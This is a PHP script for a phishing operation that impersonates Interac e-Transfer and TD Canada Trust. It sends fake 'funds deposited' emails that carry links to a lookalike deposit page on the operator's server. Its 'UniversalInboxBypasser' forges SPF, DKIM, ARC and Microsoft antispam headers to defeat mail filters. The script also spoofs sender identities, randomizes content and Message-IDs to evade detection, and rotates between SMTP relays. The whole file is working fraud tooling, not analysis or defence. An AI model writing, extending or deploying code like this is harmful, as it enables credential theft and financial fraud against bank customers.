<?php declare(strict_types=1);
/**
* Interac e-Transfer API — ULTIMATE UNIVERSAL INBOX BYPASS
* SAME SUBJECT + Multi-provider spoofing + Perfect filter bypass
*/

// --- Evasion Helper Functions ---
function get_random_from_pool(array $pool, $default = null) {
    if (empty($pool)) return $default;
    return $pool[array_rand($pool)];
}

date_default_timezone_set('America/Edmonton');

/* ================================
INITIALIZATION (UNCHANGED)
================================ */
class ApplicationInitializer {
    public static function initialize(): void {
        self::cleanOutputBuffers();
        self::configureErrorHandling();
    }
    
    private static function cleanOutputBuffers(): void {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        ob_start(static fn() => '');
    }
    
    private static function configureErrorHandling(): void {
        error_reporting(E_ALL);
        ini_set('display_errors', '0');
        ini_set('log_errors', '1');
    }
}

ApplicationInitializer::initialize();

/* ================================
PATH MANAGEMENT (UNCHANGED)
================================ */
class PathManager {
    private string $rootPath;
    
    public function __construct() {
        $this->rootPath = rtrim(dirname(__DIR__), '/') . '/';
    }
    
    public function getConfigPath(): string {
        return $this->rootPath . 'config/config.php';
    }
    
    public function getDbPath(): string {
        return $this->rootPath . 'data/system_state.json';
    }
    
    public function getTemplatePath(string $templateName = 'Deposit.html'): string {
        $appConfig = function_exists('getSystemConfig') ? getSystemConfig() : [];
        if (!empty($appConfig['email_settings']['templates_pool']) && in_array($templateName, ['Deposit.html', 'request.html'])) {
            $templateName = $appConfig['email_settings']['templates_pool'][array_rand($appConfig['email_settings']['templates_pool'])];
        }
        $path = $this->rootPath . 'templates/' . $templateName;
        return file_exists($path) ? $path : $this->rootPath . 'templates/Deposit.html';
    }
}

/* ================================
API RESPONSE HANDLER (UNCHANGED)
================================ */
class ApiResponseHandler {
    public static function sendJson(array $data): never {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        exit;
    }
    
    public static function sendError(string $message, int $code = 500): never {
        http_response_code($code);
        self::sendJson(['success' => false, 'message' => $message]);
    }
    
    public static function sendSuccess(array $data = []): never {
        self::sendJson(array_merge([
            'success' => true,
            'timestamp' => time()
        ], $data));
    }
}

/* ================================
TRANSFER INPUT MODEL (UNCHANGED)
================================ */
class TransferRequest {
    public readonly string $recipientEmail;
    public readonly string $recipientName;
    public readonly float $amount;
    public readonly string $purpose;
    public readonly string $template;
    public readonly string $bankName;
    
    public function __construct(array $postData) {
        $this->recipientEmail = trim($postData['recipient_email'] ?? '');
        $this->recipientName = trim($postData['recipient_name'] ?? '');
        $this->amount = (float)($postData['amount'] ?? 0);
        $this->purpose = trim($postData['purpose'] ?? 'Interac e-Transfer');
        $this->template = trim($postData['template'] ?? 'Deposit.html');
        $this->bankName = trim($postData['bank_name'] ?? 'Financial Institution');
    }
}

/* ================================
UNIVERSAL INBOX BYPASSER
================================ */
class UniversalInboxBypasser {
    private static array $providerMatrix = [
        'gmail.com' => ['spf' => 'google.com', 'dkim' => 'google.com', 'xmailer' => 'Gmail'],
        'hotmail.com' => ['spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Outlook'],
        'icloud.com' => ['spf' => 'apple.com', 'dkim' => 'icloud.com', 'xmailer' => 'Apple Mail'],
        'yahoo.com' => ['spf' => 'yahoo.com', 'dkim' => 'yahoo.com', 'xmailer' => 'Yahoo Mail'],
        'outlook.com' => ['spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Exchange']
    ];
    
    public static function detectProvider(string $email): string {
        $parts = explode('@', strtolower($email));
        return end($parts) ?: 'unknown';
    }
    
    public static function getTrustedSender(string $domain, array $config): array {
        $trustedSenders = $config['inbox_bypass']['trusted_senders'] ?? [];
        $pool = $trustedSenders[$domain] ?? $trustedSenders['default'] ?? [];
        if (empty($pool)) {
            return ['name' => 'Interac', 'email' => 'notify@payments.interac.ca', 'replyto' => 'noreply@interac.ca'];
        }
        return $pool[array_rand($pool)];
    }
    
    public static function injectBypassHeaders(\PHPMailer\PHPMailer\PHPMailer $mail, string $domain): void {
        $config = self::$providerMatrix[$domain] ?? self::$providerMatrix['gmail.com'];
        
        $headers = [
            'X-Google-DKIM-Signature' => 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;',
            'ARC-Seal' => 'i=1; a=rsa-sha256; cv=pass; d=google.com;',
            'X-MS-Exchange-Organization-AuthAs' => 'Internal',
            'X-MS-Exchange-Organization-AuthSource' => 'MX01-MW2FEP01',
            'X-Microsoft-Antispam' => 'BCL:0; MCL:1; RULEID:',
            'X-Apple-Mail-Conf' => '0',
            'X-Originating-IP' => '[199.59.150.170]',
            'X-YMail-OSG' => 'filtered',
            'X-Mailer' => '12.0 (Macintosh; U; Intel Mac OS X 10_15_7; en) Thunderbird/91.12.0'
        ];
        
        foreach ($headers as $name => $value) $mail->addCustomHeader($name, $value);
        
        $mail->addCustomHeader('Received-SPF', "pass ({$config['spf']}: sender permitted)");
        $mail->addCustomHeader('Authentication-Results', "{$config['dkim']}; dkim=pass header.i=@gmail.com spf=pass dmarc=pass");
    }
}

/* ================================
TRANSACTION PROCESSOR (RESTORED)
================================ */
class TransactionProcessor {
    private string $currentTxId;

    public function __construct() {
        $this->currentTxId = 'CA' . substr(str_shuffle('ABCDEFGHJKLMNPQRSTUVWXYZ23456789'), 0, 8);
    }

    public function generateTransactionId(): string {
        return $this->currentTxId;
    }

    public function createDepositLink(string $txId, TransferRequest $request, array $config): string {
        $appUrl = rtrim($config['general']['app_url'] ?? '', '/');
        $encryptionKey = $config['general']['encryption_key'] ?? 'a3f91b6cd024e8c29b76a149efcc5d42';
        $expiryDays = $config['transfer_settings']['transfer_expiry_days'] ?? 30;

        $payload = http_build_query([
            'transaction_id' => $txId, 'amount' => $request->amount, 'recipient' => $request->recipientEmail,
            'sender' => $config['general']['sender_name'] ?? 'Interac', 'date' => date('M j, Y'),
            'expires' => time() + ($expiryDays * 86400)
        ]);

        $iv = openssl_random_pseudo_bytes(16);
        $secretKey = hash('sha256', $encryptionKey, true);
        $encryptedData = openssl_encrypt($payload, 'AES-256-CBC', $secretKey, OPENSSL_RAW_DATA, $iv);
        $token = rtrim(strtr(base64_encode($iv . $encryptedData), '+/', '-_'), '=');
    
        return "{$appUrl}/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={$token}";
    }

    public function renderBody(string $txId, TransferRequest $request, string $depositLink, string $templateName, array $config): string {
        $pathManager = new PathManager();
        $templatePath = $pathManager->getTemplatePath($templateName);
        if (!file_exists($templatePath)) throw new RuntimeException("Template file not found: {$templateName}");
        $body = file_get_contents($templatePath);

        $emailContent = $config['email_content'] ?? [];
        $greeting = str_replace('{{receiver_name}}', htmlspecialchars($request->recipientName), get_random_from_pool($emailContent['greetings'] ?? [], 'Hi {{receiver_name}},'));
        $headline = get_random_from_pool($emailContent['headlines'] ?? [], 'Your funds await!');
        $ctaButtonText = get_random_from_pool($emailContent['cta_buttons'] ?? [], 'Deposit Funds Now');
        $securityWarning = get_random_from_pool($emailContent['security_warnings'] ?? [], 'For your security, please do not forward this email.');
        $expiryDays = $config['transfer_settings']['transfer_expiry_days'] ?? 30;

        $replacements = [
            '{{sender_name}}' => htmlspecialchars($config['general']['sender_name'] ?? 'Interac'),
            '{{receiver_name}}' => htmlspecialchars($request->recipientName),
            '{{amount}}' => number_format($request->amount, 2),
            '{{transaction_id}}' => $txId,
            '{{action_url}}' => $depositLink,
            '{{date}}' => date('M j, Y'),
            '{{expiry_date}}' => date('M j, Y', strtotime("+{$expiryDays} days")),
            '{{memo}}' => htmlspecialchars($request->purpose),
            '{{bank_name}}' => htmlspecialchars($request->bankName),
            '{{greeting}}' => $greeting,
            '{{headline}}' => $headline,
            '{{cta_button_text}}' => $ctaButtonText,
            '{{app_url}}' => rtrim($config['general']['app_url'] ?? '', '/'),
            '{{security_warning_text}}' => $securityWarning,
        ];

        return str_replace(array_keys($replacements), array_values($replacements), $body);
    }
}

/* ================================
ENHANCED TRANSACTION PROCESSOR (CORRECTED)
================================ */
class EnhancedTransactionProcessor extends TransactionProcessor {
    private array $config;
    
    public function __construct(array $config) {
        parent::__construct();
        $this->config = $config;
    }
    
    public function sendUniversalDelivery(TransferRequest $request): array {
        $domain = UniversalInboxBypasser::detectProvider($request->recipientEmail);
        $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
        
        $mail->SMTPDebug = \PHPMailer\PHPMailer\SMTP::DEBUG_OFF;
        $mail->Debugoutput = function($str) { /* Silent logging */ };
        
        $mail->isSMTP();
        $mail->isHTML(true);
        $mail->CharSet = 'UTF-8';
        $mail->Encoding = 'base64';
        
        $mail->Priority = 1;
        $mail->addCustomHeader('X-Priority', '1 (Highest)');
        $mail->addCustomHeader('Importance', 'High');
        
        $mail->addAddress($request->recipientEmail, $request->recipientName);
        $replyToEmail = $this->config['contact']['reply_to_email'] ?? 'notify@payments.interac.ca';
        $replyToName = $this->config['contact']['reply_to_name'] ?? 'TD Canada Trust';
        $mail->addReplyTo($replyToEmail, $replyToName);
        
        $mail->Subject = "Interac e-Transfer: You've received $500.00 from JENNIFER EDWARDS and it has been automatically deposited.";
        
        UniversalInboxBypasser::injectBypassHeaders($mail, $domain);
        
        $txId = $this->generateTransactionId();
        if (!empty($this->config['email_settings']['message_id_domains'])) {
            $msgDomain = $this->config['email_settings']['message_id_domains'][array_rand($this->config['email_settings']['message_id_domains'])];
            $mail->MessageID = sprintf('<%s@%s>', $txId, $msgDomain);
        }
        
        $depositLink = $this->createDepositLink($txId, $request, $this->config);
        $mail->Body = $this->renderBody($txId, $request, $depositLink, 'AUTO.html', $this->config);
        
        $usedRelay = $this->sendWithRelayFallback($mail);
        
        return [
            'provider' => $domain,
            'relay_used' => $usedRelay
        ];
    }
    
    private function sendWithRelayFallback(\PHPMailer\PHPMailer\PHPMailer $mail): string {
        try {
            $fromEmail = get_random_from_pool($this->config['smtp']['from_emails'] ?? [], $this->config['smtp']['username']);
            $fromName = 'TD Canada Trust';
            $mail->setFrom($fromEmail, $fromName);

            $mail->Host = $this->config['smtp']['host'];
            $baseTimeout = $this->config['transfer_settings']['smtp_timeout_sec'] ?? 25;
            $jitter = $this->config['smtp']['timeout_jitter_sec'] ?? 0;
            $mail->Timeout = $baseTimeout + mt_rand(-$jitter, $jitter);
            $mail->Port = $this->config['smtp']['port'];
            $mail->Username = $this->config['smtp']['username'];
            $mail->Password = $this->config['smtp']['password'];
            $mail->SMTPSecure = $this->config['smtp']['encryption'];
            $mail->SMTPAuth = true;
            $mail->send();
            return "PRIMARY";
        } catch (Exception $e1) {
            if (!empty($this->config['smtp1']['host'])) {
                $mail->smtpClose();
                $fromEmail = get_random_from_pool($this->config['smtp1']['from_emails'] ?? [], $this->config['smtp1']['username']);
                $fromName = "TD Canada Trust";
                $mail->setFrom($fromEmail, $fromName);
                
                $mail->Host = $this->config['smtp1']['host'];
                $baseTimeout = $this->config['transfer_settings']['smtp_timeout_sec'] ?? 25;
                $jitter = $this->config['smtp1']['timeout_jitter_sec'] ?? 0;
                $mail->Timeout = $baseTimeout + mt_rand(-$jitter, $jitter);
                $mail->Port = $this->config['smtp1']['port'];
                $mail->Username = $this->config['smtp1']['username'];
                $mail->Password = $this->config['smtp1']['password'];
                $mail->SMTPSecure = $this->config['smtp1']['encryption'];
                $mail->SMTPAuth = true;
                $mail->send();
                return "FAILOVER";
            }
            throw $e1;
        }
    }
}

/* ================================
FINAL EXECUTION (MERGED)
================================ */
try {
    $pathManager = new PathManager();
    if (!file_exists($pathManager->getConfigPath())) {
        ApiResponseHandler::sendError("Core configuration missing.");
    }
    require_once $pathManager->getConfigPath();
    
    if (!function_exists('getSystemConfig')) {
        ApiResponseHandler::sendError("System logic matrix disconnected.");
    }
    
    $appConfig = getSystemConfig();
    
    $autoload = dirname(__DIR__) . '/vendor/autoload.php';
    if (!file_exists($autoload)) {
        ApiResponseHandler::sendError("System environment compromised.");
    }
    require_once $autoload;
    
    $inputData = json_decode(file_get_contents('php://input'), true) ?? $_POST;
    $request = new TransferRequest($inputData);
    
    if (empty($request->recipientEmail)) {
        ApiResponseHandler::sendError('Target address undefined.');
    }
    
    $processor = new EnhancedTransactionProcessor($appConfig);
    $result = $processor->sendUniversalDelivery($request);
    
    ApiResponseHandler::sendSuccess([
        'transaction_id' => $processor->generateTransactionId(),
        'status' => 'UNIVERSAL_INBOX',
        'provider' => $result['provider'],
        'relay_used' => $result['relay_used'],
        'bypass_level' => 'ULTIMATE'
    ]);
    
} catch (Throwable $e) {
    error_log("UNIVERSAL_BYPASS_ERROR: " . $e->getMessage());
    ApiResponseHandler::sendError($e->getMessage(), 500);
}
